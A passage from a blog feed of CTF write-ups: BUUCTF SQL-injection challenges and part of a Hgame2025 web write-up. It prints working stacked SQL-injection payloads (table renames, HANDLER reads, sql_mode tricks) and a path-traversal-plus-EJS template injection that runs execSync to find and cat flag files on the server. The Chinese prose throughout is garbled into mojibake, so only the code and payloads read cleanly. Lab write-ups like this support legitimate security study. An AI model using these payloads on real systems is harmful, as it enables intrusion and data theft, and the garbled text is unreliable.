è¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡ handler è¯­å¥å¹¶ä¸å…·å¤‡ select è¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå¹¶ä¸”æ˜¯ mysql ä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ° SQL æ ‡å‡†ä¸­ã€‚</p><p>handler ä½¿ç”¨æ ¼å¼ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">æ‰“å¼€è¡¨ï¼š<br>HANDLER è¡¨å <span class="hljs-keyword">OPEN</span> ;<br><br>æŸ¥çœ‹æ•°æ®ï¼š<br>HANDLER è¡¨å READ next;<br><br>å…³é—­è¡¨ï¼š<br>HANDLER è¡¨å READ <span class="hljs-keyword">CLOSE</span>;<br></code></pre></td></tr></table></figure><p>æœ¬é¢˜å³å…ˆç”¨ handler æ‰“å¼€ <code>1919810931114514</code> è¡¨ï¼Œè¯»å–è¡¨çš„ç¬¬ä¸€è¡Œæ•°æ®ï¼Œç„¶åå…³é—­è¡¨</p><h2 id="æ–¹æ³•å››ï¼šæ ¹æ®åŸæœ¬æŸ¥è¯¢è¯­å¥çš„é€»è¾‘ä¿®æ”¹è¡¨åå’Œåˆ—åï¼ˆç›¸å¯¹å–å·§ï¼‰"><a href="#æ–¹æ³•å››ï¼šæ ¹æ®åŸæœ¬æŸ¥è¯¢è¯­å¥çš„é€»è¾‘ä¿®æ”¹è¡¨åå’Œåˆ—åï¼ˆç›¸å¯¹å–å·§ï¼‰" class="headerlink" title="æ–¹æ³•å››ï¼šæ ¹æ®åŸæœ¬æŸ¥è¯¢è¯­å¥çš„é€»è¾‘ä¿®æ”¹è¡¨åå’Œåˆ—åï¼ˆç›¸å¯¹å–å·§ï¼‰"></a>æ–¹æ³•å››ï¼šæ ¹æ®åŸæœ¬æŸ¥è¯¢è¯­å¥çš„é€»è¾‘ä¿®æ”¹è¡¨åå’Œåˆ—åï¼ˆç›¸å¯¹å–å·§ï¼‰</h2><p>æˆ‘ä»¬è¾“å…¥ 1 åï¼Œé»˜è®¤ä¼šæ˜¾ç¤º id ä¸º 1 çš„æ•°æ®ï¼Œå¯ä»¥çŒœæµ‹é»˜è®¤æ˜¾ç¤ºçš„æ˜¯ words è¡¨çš„æ•°æ®ï¼Œé‚£ä¹ˆåªè¦æ›´æ”¹ç›®æ ‡è¡¨çš„åç§°å’Œç»“æ„ä¸º words è¡¨ã€words è¡¨æ”¹æˆå…¶ä»–åç§°ï¼Œå°±å¯ä»¥è¾¾åˆ°åˆ©ç”¨åŸæœ‰æŸ¥è¯¢è¯­å¥ç›´æ¥æŸ¥è¯¢ flag å­—æ®µçš„å€¼çš„æ•ˆæœ</p><p>ä¿®æ”¹è¡¨åã€æ·»åŠ åˆ—çš„è¯­æ³•æ ¼å¼ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">ä¿®æ”¹è¡¨åï¼š<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> æ—§è¡¨å RENAME <span class="hljs-keyword">TO</span> æ–°è¡¨å;<br><br>ä¿®æ”¹å­—æ®µï¼š<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> è¡¨å CHANGE æ—§å­—æ®µå æ–°å­—æ®µå æ–°æ•°æ®ç±»å‹;<br><br>æ·»åŠ åˆ—ï¼š<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> TABLE_NAME <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> NEW_COLUMN_NAME <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">first</span>;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ words è¡¨ç»“æ„ <code>1&#39;;desc words;#</code> æ€»å…±ä¸¤ä¸ªå­—æ®µ id å’Œ dataï¼Œæ¨æµ‹åº”è¯¥æ˜¯è¾“å…¥ id ç»™å‡ºå¯¹åº” data</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/TnErbguBhoNNlgxeylXc356Fnh7.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠ words è¡¨éšä¾¿æ”¹æˆå…¶ä»–åç§°ï¼Œç„¶åæŠŠç›®æ ‡ 1919810931114514 è¡¨æ”¹æˆ wordsï¼Œå†æŠŠåˆ—å flag æ”¹æˆ dataï¼Œåœ¨æœ€å‰åˆ—æ·»åŠ  id åˆ—å³å¯å®ç°æŸ¥è¯¢</p><p><code>1&#39;; alter table words rename to words1;alter table </code> 1919810931114514 <code>rename to words;alter table words change flag data varchar(50);alter table words add column id int(10) not null first;#</code></p><p>æ‰§è¡Œåï¼Œå…ˆè¯»å–äº†åŸæœ¬ words è¡¨çš„ id&#x3D;1 çš„ data å¹¶è¿”å›è¾“å‡º</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/H2nHbYVZRoI1r7xBQKZcaohhnRg.png"></p><p>è¾“å…¥ï¼ˆidï¼‰0 æŸ¥è¯¢ï¼Œå³å¾— flag</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/D8gdb3B62oci4Ix8brjc1Xbon2b.png"></p><p>æˆ–è€…å‚è€ƒæˆ‘æ‰€å‚è€ƒçš„çŸ¥ä¹é‚£ç¯‡ wpï¼Œç›´æ¥å°† flag é‡å‘½åä¸º idï¼Œç„¶å <code>1&#39; or 1=1#</code> æŸ¥çœ‹æ‰€æœ‰å†…å®¹</p><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><p><a href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a></p><p><a href="https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8">https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>è¿˜æ˜¯å…ˆç”¨ BP æ‰«ä¸€éï¼Œå¯ä»¥çœ‹åˆ°è®¸å¤šå…³é”®è¯å¦‚ andã€fromã€information è¢«è¿‡æ»¤ï¼Œè”åˆæ³¨å…¥ã€æŠ¥é”™æ³¨å…¥åŸºæœ¬æ’é™¤</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/T6Trb69KpoBDWDx9kDmcnkqEnsc.png"></p><p>ç»¼åˆè€ƒè™‘å…ˆå°è¯•å †å æ³¨å…¥ï¼Œè¾“å…¥ <code>1;show databases;#</code>ï¼ŒæˆåŠŸè·å–æ•°æ®åº“åï¼Œè¯´æ˜æ˜¯æ•°å­—å‹æ— éœ€å…¶ä»–é—­åˆï¼Œä¸”å †å æ³¨å…¥å¯è¡Œ</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/KGXUbk5GooGT6Sxv8ypcLW5xnoh.png"></p><p>ç»§ç»­è¾“å…¥ <code>1;show tables;#</code>ï¼Œå‘ç° Flag è¡¨</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/HaLqbQoEcoXOvSxR864cGDk3nth.png"></p><p>å°è¯• handler è¯»å– <code>1;handler Flag open;handler Flag read first;handler Flag close;#</code>ï¼Œç»“æœå‘ç° Flag è¢«è¿‡æ»¤ï¼Œå› ä¸º handler å’Œ from è¢«è¿‡æ»¤ï¼Œä¹Ÿæ— æ³•ä½¿ç”¨å‰ä¸€é¢˜çš„é¢„ç¼–è¯‘ç»•è¿‡ï¼Œå…¶ä»–å„ç§ç»•è¿‡æ–¹æ³•è¯•äº†ä¸€éï¼Œè¿‡é•¿æ—¶ä¹Ÿä¼šæ‹¦æˆªï¼Œæœ€ååªèƒ½å€Ÿé‰´ç½‘ä¸Šçš„ WPã€‚</p><p>è¿™é“é¢˜éœ€è¦æ¨æµ‹æŸ¥è¯¢è¯­å¥çš„å¤§è‡´ç»“æ„ï¼Œè¿™é‡Œçš„ sql è¯­å¥ä¸º <code>select $post[&#39;query&#39;]||flag from Flag</code>ï¼Œè¡¨ç°å‡ºæ¥çš„ç‰¹å¾æ˜¯è¾“å…¥éé›¶æ—¶æœ‰å›æ˜¾ï¼Œè¾“å…¥ 0 æˆ–å…¶ä»–å­—ç¬¦æ—¶å‡æ— å›æ˜¾æˆ–æ˜¯æŠ¥é”™ï¼Œåšé¢˜æ—¶éœ€è¦æ ¹æ®è¿™ä¸ªç‰¹å¾æ¨æµ‹æ‰èƒ½ç»§ç»­åšä¸‹å»ã€‚</p><h2 id="æ–¹æ³•ä¸€ï¼šä¿®æ”¹-sql-mode"><a href="#æ–¹æ³•ä¸€ï¼šä¿®æ”¹-sql-mode" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä¿®æ”¹ sql_mode"></a>æ–¹æ³•ä¸€ï¼šä¿®æ”¹ sql_mode</h2><p>ä¿®æ”¹ MySQL æœåŠ¡çš„ç¯å¢ƒå˜é‡ sql_modeï¼Œç”¨äºè®¾ç½® MySQL æ”¯æŒçš„è¯­æ³•å’Œæ•°æ®æ ¡éªŒæ¨¡å¼ã€‚æœ¬é¢˜å°† sql_mode è®¾ä¸º <code>pipes_as_concat</code>ï¼Œä½œç”¨æ˜¯å°† || çš„ä½œç”¨ç”± or å˜ä¸ºæ‹¼æ¥å­—ç¬¦ä¸²ã€‚</p><p>æ‰€ä»¥è¾“å…¥ <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> æ—¶åŸæœ‰çš„æŸ¥è¯¢è¯­å¥å°±ä¼šå°† <code>select 1</code> å’Œ <code>select flag from Flag</code> çš„ç»“æœæ‹¼æ¥åœ¨ä¸€èµ·è¿”å›ã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/F3LUbtmpFomIgYxYKTscUwpSnZd.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">é™„åŠ å‡ ç§å¸¸è§çš„sql_modeå€¼çš„ä»‹ç»ï¼š<br><br>å‡ ç§å¸¸è§çš„modeä»‹ç»<br>ONLY_FULL_GROUP_BYï¼šå‡ºç°åœ¨<span class="hljs-keyword">select</span>è¯­å¥ã€<span class="hljs-keyword">HAVING</span>æ¡ä»¶å’Œ<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span>è¯­å¥ä¸­çš„åˆ—ï¼Œå¿…é¡»æ˜¯<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>çš„åˆ—æˆ–è€…ä¾èµ–äº<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>åˆ—çš„å‡½æ•°åˆ—ã€‚<br><br>NO_AUTO_VALUE_ON_ZEROï¼šè¯¥å€¼å½±å“è‡ªå¢é•¿åˆ—çš„æ’å…¥ã€‚é»˜è®¤è®¾ç½®ä¸‹ï¼Œæ’å…¥<span class="hljs-number">0</span>æˆ–<span class="hljs-keyword">NULL</span>ä»£è¡¨ç”Ÿæˆä¸‹ä¸€ä¸ªè‡ªå¢é•¿å€¼ã€‚å¦‚æœç”¨æˆ·å¸Œæœ›æ’å…¥çš„å€¼ä¸º<span class="hljs-number">0</span>ï¼Œè€Œè¯¥åˆ—åˆæ˜¯è‡ªå¢é•¿çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªé€‰é¡¹å°±æœ‰ç”¨äº†ã€‚<br><br>STRICT_TRANS_TABLESï¼šåœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œå¦‚æœä¸€ä¸ªå€¼ä¸èƒ½æ’å…¥åˆ°ä¸€ä¸ªäº‹åŠ¡è¡¨ä¸­ï¼Œåˆ™ä¸­æ–­å½“å‰çš„æ“ä½œï¼Œå¯¹éäº‹åŠ¡è¡¨ä¸åšé™åˆ¶<br><br>NO_ZERO_IN_DATEï¼šè¿™ä¸ªæ¨¡å¼å½±å“äº†æ˜¯å¦å…è®¸æ—¥æœŸä¸­çš„æœˆä»½å’Œæ—¥åŒ…å«<span class="hljs-number">0</span>ã€‚å¦‚æœå¼€å¯æ­¤æ¨¡å¼ï¼Œ<span class="hljs-number">2016</span><span class="hljs-number">-01</span><span class="hljs-number">-00</span>æ˜¯ä¸å…è®¸çš„ï¼Œä½†æ˜¯<span class="hljs-number">0000</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span>æ˜¯å…è®¸çš„ã€‚å®ƒå®é™…çš„è¡Œä¸ºå—åˆ° <span class="hljs-keyword">strict</span> modeæ˜¯å¦å¼€å¯çš„å½±å“<span class="hljs-number">1</span>ã€‚<br><br>NO_ZERO_DATEï¼šè®¾ç½®è¯¥å€¼ï¼Œmysqlæ•°æ®åº“ä¸å…è®¸æ’å…¥é›¶æ—¥æœŸã€‚å®ƒå®é™…çš„è¡Œä¸ºå—åˆ° strictmodeæ˜¯å¦å¼€å¯çš„å½±å“<span class="hljs-number">2</span>ã€‚<br><br>ERROR_FOR_DIVISION_BY_ZEROï¼šåœ¨<span class="hljs-keyword">INSERT</span>æˆ–<span class="hljs-keyword">UPDATE</span>è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ•°æ®è¢«é›¶é™¤ï¼Œåˆ™äº§ç”Ÿé”™è¯¯è€Œéè­¦å‘Šã€‚å¦‚æœæœªç»™å‡ºè¯¥æ¨¡å¼ï¼Œé‚£ä¹ˆæ•°æ®è¢«é›¶é™¤æ—¶MySQLè¿”å›<span class="hljs-keyword">NULL</span><br><br>NO_AUTO_CREATE_USERï¼šç¦æ­¢<span class="hljs-keyword">GRANT</span>åˆ›å»ºå¯†ç ä¸ºç©ºçš„ç”¨æˆ·<br><br>NO_ENGINE_SUBSTITUTIONï¼šå¦‚æœéœ€è¦çš„å­˜å‚¨å¼•æ“è¢«ç¦ç”¨æˆ–æœªç¼–è¯‘ï¼Œé‚£ä¹ˆæŠ›å‡ºé”™è¯¯ã€‚ä¸è®¾ç½®æ­¤å€¼æ—¶ï¼Œç”¨é»˜è®¤çš„å­˜å‚¨å¼•æ“æ›¿ä»£ï¼Œå¹¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸<br><br>PIPES_AS_CONCATï¼šå°†â€||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼<br><br>ANSI_QUOTESï¼šå¯ç”¨ANSI_QUOTESåï¼Œä¸èƒ½ç”¨åŒå¼•å·æ¥å¼•ç”¨å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«è§£é‡Šä¸ºè¯†åˆ«ç¬¦<br></code></pre></td></tr></table></figure><h2 id="æ–¹æ³•äºŒï¼šæ»¡è¶³-çš„æ¡ä»¶"><a href="#æ–¹æ³•äºŒï¼šæ»¡è¶³-çš„æ¡ä»¶" class="headerlink" title="æ–¹æ³•äºŒï¼šæ»¡è¶³ || çš„æ¡ä»¶"></a>æ–¹æ³•äºŒï¼šæ»¡è¶³ || çš„æ¡ä»¶</h2><p>å¦‚æœ <code>$post[â€˜queryâ€™]</code> çš„æ•°æ®ä¸º <code>*,1</code>ï¼Œsql è¯­å¥å°±å˜æˆäº† <code>select *,1||flag from Flag</code>ï¼Œä¹Ÿå°±æ˜¯ <code>select *,1 from Flag</code>ï¼Œå¯ä»¥ç›´æ¥æŸ¥è¯¢å‡º Flag è¡¨ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚è¾“å…¥ <code>1;select *,1</code></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Zey3bJzAMoqJcIx0tC7c8lErnyc.png"></p><h2 id="å‚è€ƒï¼š-1"><a href="#å‚è€ƒï¼š-1" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><p><a href="https://ek1ng.com/notes.html#SUSCTF2019-EasySQL">https://ek1ng.com/notes.html#SUSCTF2019-EasySQL</a></p><p><a href="https://www.cnblogs.com/gtx690/p/13176458.html">https://www.cnblogs.com/gtx690/p/13176458.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2025 WP</title>
    <link href="/2025/03/02/Hgame2025WP/"/>
    <url>/2025/03/02/Hgame2025WP/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025WP"><a href="#Hgame2025WP" class="headerlink" title="Hgame2025WP"></a>Hgame2025WP</h1><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><h3 id="TEST-NC"><a href="#TEST-NC" class="headerlink" title="TEST NC"></a>TEST NC</h3><p>è¿æ¥å <code>cat flag</code></p><h3 id="ä»è¿™é‡Œå¼€å§‹çš„åºç« "><a href="#ä»è¿™é‡Œå¼€å§‹çš„åºç« " class="headerlink" title="ä»è¿™é‡Œå¼€å§‹çš„åºç« "></a>ä»è¿™é‡Œå¼€å§‹çš„åºç« </h3><p>å¤åˆ¶ç²˜è´´</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>æŠ“åŒ…æ²¡æœ‰å‘ç°é€šä¿¡ï¼Œçº¯å‰ç«¯ js çš„å°æ¸¸æˆ</p><p>ç¦ç”¨ F12ï¼Œå…¶ä»–æ–¹å¼æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œå®¡è®¡ä»£ç ï¼Œå‘ç°å¤§é‡åç§°è¢«é‡å‘½åæ··æ·†ï¼Œæœªèƒ½æ‰¾åˆ° gameoverã€alertã€flag ç­‰ç›¸å…³æœ‰æ•ˆä¿¡æ¯ï¼Œæ‰€ä»¥å°è¯•é€šå…³æ¸¸æˆè·å¾— flagã€‚</p><p>åœ¨ index.js å‘ç°è®°å½•åœ°å›¾æ•°æ®çš„ <code>map</code> å­—æ®µï¼Œç»æ¯”å¯¹å‘ç° 0x0 ä¸ºå¯ç§»åŠ¨çš„ç©ºåœ°ï¼Œ0x1 ä¸ºå¢™ï¼Œ0x2 ä¸ºæ•Œäººå¯é€šè¿‡çš„é€šé“ï¼Œè€Œåå‘ç° <code>_LIFE = 0x5,_SCORE = 0x0;</code> åˆ†åˆ«è®°å½•ç”Ÿå‘½å€¼å’Œåˆå§‹åˆ†æ•°ã€‚è€Œé€šå…³çš„è¦æ±‚æ˜¯æ€»åˆ†è¾¾åˆ° 10000 ä¸”é€ƒç¦»ï¼ˆå®Œæˆæ‰€æœ‰å…³å¡ levelï¼‰æ‰€ä»¥æ€»çš„æ€è·¯æ˜¯ï¼šä¿®æ”¹åˆå§‹åˆ†æ•°åˆ°è¾¾è¦æ±‚ï¼Œæ”¹å˜åœ°å›¾ç»“æ„æ¥å¿«é€Ÿé€šå…³ï¼ˆæµ‹è¯•å‘ç°è¦åƒå®Œä¸€å…³å†…æ‰€æœ‰è±†å­æ‰èƒ½åˆ°ä¸‹ä¸€ä¸ªå…³å¡ï¼Œåªæœ‰ 0x0 ä¼šåˆ·è±†å­ï¼‰å¹¶é˜²æ­¢æ•Œäººæ‰£é™¤ç”Ÿå‘½å€¼</p><p>æ“ä½œï¼š</p><p>åˆ©ç”¨ Chrome çš„ Overrides åŠŸèƒ½å°† js ä»£ç é‡è½½ï¼Œç”¨æœ¬åœ°æ–‡ä»¶è¦†ç›–</p><p>ä¿®æ”¹ <code>_SCORE = 0x10000;</code> ç›´æ¥æ»¡è¶³åˆ†æ•°è¦æ±‚ï¼ˆ16^4ï¼‰</p><p>ç”¨è„šæœ¬ç”Ÿæˆä¸€ä¸ªæ–°åœ°å›¾ï¼Œé™åˆ¶æ•Œäººè¡ŒåŠ¨ã€å‡å°‘è±†å­åˆ·æ–°ï¼Œç²˜è´´æ›¿æ¢åˆ° js æ–‡ä»¶ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">new_maps=[[[<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>)]<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>)]<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">12</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> c &gt;= <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-number">17</span> <span class="hljs-keyword">or</span> (c == <span class="hljs-number">10</span> <span class="hljs-keyword">or</span> c == <span class="hljs-number">17</span>) <span class="hljs-keyword">and</span> i &gt; <span class="hljs-number">12</span> <span class="hljs-keyword">and</span> i &lt; <span class="hljs-number">16</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x1&#x27;</span><br>            <span class="hljs-keyword">elif</span> i == <span class="hljs-number">23</span> <span class="hljs-keyword">and</span> c == <span class="hljs-number">13</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x0&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x2&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;map.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>front=<span class="hljs-string">&quot;&#123;&#x27;map&#x27;: [&quot;</span><br>behind=<span class="hljs-string">&quot;\n&#x27;wall_color&#x27;: _0x3a9ed7(0x12c),&#x27;goods&#x27;: &#123;&#x27;1,3&#x27;: 0x1,&#x27;26,3&#x27;: 0x1,&#x27;1,23&#x27;: 0x1,&#x27;26,23&#x27;: 0x1&#125;&#125;,\n&quot;</span><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>):<br>    f.write(front)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):<br>        f.write(<span class="hljs-string">&#x27;[&#x27;</span>)<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> c == <span class="hljs-number">27</span>:<br>                f.write(new_maps[m][i][c])<br>                <span class="hljs-keyword">continue</span><br>            f.write(new_maps[m][i][c]+<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">30</span>:<br>            f.write(<span class="hljs-string">&#x27;]&#x27;</span>)<br>        f.write(<span class="hljs-string">&#x27;],&#x27;</span>)<br>    f.write(behind)<br>f.close()<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œåä¿å­˜ï¼Œåˆ·æ–°é¡µé¢</p><p><img src="/img/Hgame2025WP/UbBBbUvyRojxIax1hBccxvlHnbd.png"></p><p>æ¸¸æˆä¸€å¼€å§‹åªè¦åƒæ‰åŸåœ°çš„è±†å­å°±è¿›å…¥ä¸‹ä¸€å…³ï¼Œç¬é—´åˆ·æ»¡é€šå…³ï¼Œè·å¾— flagï¼ˆç®€å• base64+ æ …æ  fence è§£ç ï¼‰</p><p><img src="/img/Hgame2025WP/Y3ySbNIZMoEK5txChctcZ6XTnbf.png"></p><h3 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h3><p>å®¡è®¡ app.js ä»£ç ï¼Œ<code>/upload</code> è·¯ç”±ä¸Šä¼ æ–‡ä»¶åˆ° <code>/app/uploads/</code> ç›®å½•ï¼Œæ²¡æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œ<code>/rename</code> è·¯ç”±å¤„ç†é‡å‘½åï¼ŒåŒæ ·å‡ ä¹æ²¡æœ‰é™åˆ¶ï¼Œå¯ä»¥å®ç°ç›®å½•ç©¿è¶Šï¼Œç›¸å¯¹è·¯å¾„åŸºäº <code>/app/uploads/</code> ç›®å½•ï¼Œ<code>/</code> è·¯ç”±åˆ—å‡º <code>/app/uploads/</code> ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚ä½¿ç”¨ express æ¡†æ¶ï¼Œæ¸²æŸ“ ejs æ¨¡æ¿è¿”å›å‰ç«¯ï¼Œæœ¬åœ°çš„ <code>/app/public/</code> ç›®å½•æ˜ å°„åˆ° <code>/static</code> è·¯ç”±å­˜æ”¾é™æ€èµ„æºã€‚</p><p>æ¥ä¸‹æ¥ä¸Šé¶æœºï¼Œä¸Šä¼ ä»»æ„æ–‡ä»¶ app.jsï¼Œä½¿ç”¨ BP å‘ <code>/rename</code> POST æ–¹æ³•å‘åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶å newName ä¸º <code>../app.js</code> å³å¯ç§»åŠ¨æ–‡ä»¶åˆ° <code>/app/</code> ç›®å½•ï¼Œè¦†ç›–åŸ app.jsï¼Œä½†æ˜¯æœåŠ¡ä¸é‡å¯æ— æ³•åˆ©ç”¨ã€‚åŒæ—¶åˆ©ç”¨ rename å¯ä»¥ä½œç”¨äºä»»æ„ç›®å½•çš„æ–‡ä»¶æ‰€ä»¥ä¹Ÿå¯ä»¥è¯•æ¢æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨å¯æˆåŠŸé‡å‘½åï¼Œè‹¥ä¸å­˜åœ¨åˆ™ä¼šè¿”å› 500 æŠ¥é”™ã€‚</p><p>è€ƒè™‘é¶æœºä¸º Nodejs ç¯å¢ƒï¼Œæ’é™¤ä¸€å¥è¯æœ¨é©¬ï¼Œå°è¯• ejs æ¨¡æ¿æ³¨å…¥ã€‚ç”¨ rename è¯•æ¢åˆ° <code>/app/view/mortis.ejs</code>ï¼Œå°†å…¶é‡å‘½åä¸º <code>../public/mortis.ejs</code>ï¼Œä¸‹è½½ä¿®æ”¹æ’å…¥</p><p><code>&lt;%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;find / -type f -name &quot;*flag*&quot; 2&gt;/dev/null -exec cat &#123;&#125; +&#39;) %&gt;</code>ï¼Œå†ä¸Šä¼ ç”¨ rename ç§»å…¥ 